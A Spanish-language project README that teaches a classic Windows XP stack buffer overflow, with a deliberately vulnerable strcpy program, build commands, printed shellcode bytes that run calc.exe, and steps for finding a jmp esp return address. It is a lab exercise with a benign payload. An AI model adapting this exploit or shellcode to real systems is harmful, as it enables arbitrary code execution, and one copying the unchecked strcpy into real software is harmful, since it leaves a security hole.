<h1>Descripción</h1>
<p>El proyecto Tsunami consiste en hacer un programa vulnerable a <a href="https://es.wikipedia.org/wiki/Desbordamiento_de_b%C3%BAfer">buffer overflow</a>, y otro que aproveche esta vulnerabilidad para ejecutar la calculadora</p>
<p>Para este proyecto se usa un <a href="https://javiermartinalonso.github.io/devops/devops/vagrant/2018/02/09/vagrant-vagrantfile.html">Vagrantfile</a> que emulará una máquina Windows XP 32 bits donde se hará todo el proceso</p>
Para la creación del proyecto se ha seguido la explicación de <a href="https://wiki.elhacker.net/bugs-y-exploits/overflows-y-shellcodes/exploits-y-stack-overflows-en-windows">esta página</a>, sin embargo también haré una breve explicación del código aquí.
<h2>Archivos</h2>
<p>A continuación se hará una breve descripción de cada archivo y su función. El funcionamiento interno de cada archivo se encuentra explicado con más detalle en los comentarios de cada uno.</p>
<h3>Vuln1.c</h3>
<p>Este archivo es el ejecutable vulnerable al buffer overflow, debido a que usa la función strcpy y no comprueba la longitud que de los datos introducidos en el buffer</p>
<h3>Offset.c</h3>
<p>Esta función se usa en el proceso de creación del exploit. Al darle como argumentos una librería y una función dentro de la misma nos devolverá una dirección de memoria, donde se encuentra la función en la máquina (más adelante veremos su uso)</p>
<h3>Shellcode.c</h3>
<p>Este archivo contiene el código que iniciará la calculadora. El código está en ensamblador (se pueden encontrar ejemplos similares en internet) y para obtener las dos direcciones de memoria que podemos ver dentro del código se ha usado el offset.c</p>
<h3>Findjmp.exe</h3>
<p>Este archivo se usa para conseguir el offset de la librería kernel32.dll que necesitaremos para el shellcode</p>
<h3>Exploit.c</h3>
<p>Este es el programa que aprovechará la vulnerabilidad del programa vuln1 para desbordar el buffer y abrir la calculadora</p>

<h2>Creación</h2>
<p>El primer paso será compilar el archivo vulnerable de la siguiente forma:</p>

```
cl vuln1.c
```

Esto nos dará un archivo .obj y un archivo .exe, que será el ejecutable vulnerable.<br>
El siguiente paso será buscar los offsets necesarios para crear el shellcode, para ello compilaremos el archivo offset.c y lo ejecutaremos de la siguiente forma:

```
cl offset.c
offset.exe kernel32.dll LoadLibraryA 
offset.exe msvcrt.dll system
```

El comando cl nos dará el archivo .exe que será el que usaremos para los siguientes comandos, ambos nos darán como resultado las siguientes direcciones de memoria:<br>
`0x7c801d7b`<br>
`0x77c293c7`<br>

Estás direcciones son las correspondientes a las funciones (tercer argumento de los comandos) en las librerías (segundo argumento en los comandos). Necesitaremos esta dirección para ejecutar las funciones desde lenguaje ensamblador.

Ahora haremos el shellcode con las direcciones que hemos conseguido, en <a href="https://wiki.elhacker.net/bugs-y-exploits/overflows-y-shellcodes/exploits-y-stack-overflows-en-windows">esta página</a> podremos encontrar un ejemplo de shellcode, sin embargo este ejecutará la consola, mientras que nuestro proyecto busca ejecutar la calculadora.
Veremos que la única diferencia se encuentra en las direcciones de memoria y en las líneas con este formato: `mov byte ptr [ebp-08h],63h`

Los 2 números al final de cada línea son cada una las letras (en <a href="https://ascii.cl/es/">hexadecimal</a>) que conformarán en el primer caso la librería que queremos cargar y en el segundo el comando a ejecutar, `msvcrt.dll` y `calc.exe` respectivamente.

Con esto ya tendríamos el shellcode, pero no nos sirve así, lo necesitamos en hexadecimal para convertirlo en un payload, para esto haremos lo compilaremos

```
cl shellcode.c
```

Este comando nos dará un `shellcode.obj` y un `shellcode.exe`. El que nos interesa en este caso es el primero, pero como hemos dicho lo queremos en hexadecimal, para ello usaremos el siguiente comando:

``` 
xdd -i shellcode.obj
```

Ahora tenemos que formatear el output que hemos conseguido para que quede de la siguiente forma `\x55\x8b\xec\x33...`, para ello usaremos el siguiente comando
```
xxd -i -c1024 shellcode.obj | sed -e 's/0x/\\x/g' | sed -e 's/, //g'|tr -d ,
```
Lo que tenemos es básicamente el shellcode compilado pero en un formato que el exploit podrá utilizar. Tendremos que buscar las partes donde haya un `\x55\x8b` que son el principio y el final del comando en ensamblador.
El código resultante será el siguiente
```
\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\0xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3
```
Con esto ya tendríamos todo lo necesario para crear nuestro exploit así que vamos al lío.

Crearemos un buffer muy grande (en mi caso 1024 bytes) donde cargaremos todo el payload. Guardaremos el código hexadecimal del shellcode en una string shellcode para añadirlo al payload más tarde.
Ahora usaremos el findjmp.exe para encontrar el offset necesario para que el exploit funcione:
```
findjmp.exe kernel32.dll esp
```
Esto nos devolvera una dirección pero tendremos que introducirla en otro string al revés siendo el resultado el siguiente:
```
\x7B\x46\x86\x7C
```

Comprobaremos que se introduzca 1 argumento a la hora de ejecutar el exploit. Copiaremos el argumento que hayamos introducido en el buffer grande, para llenar el buffer vulnerable de la aplicación, luego añadiremos la dirección de memoria que acabamos de conseguir y tras esto el shellcode.

Tras esto ejecutaremos el programa vulnerable dandole como argumento el buffer malicioso que hemos creado y se abrirá la calculadora.
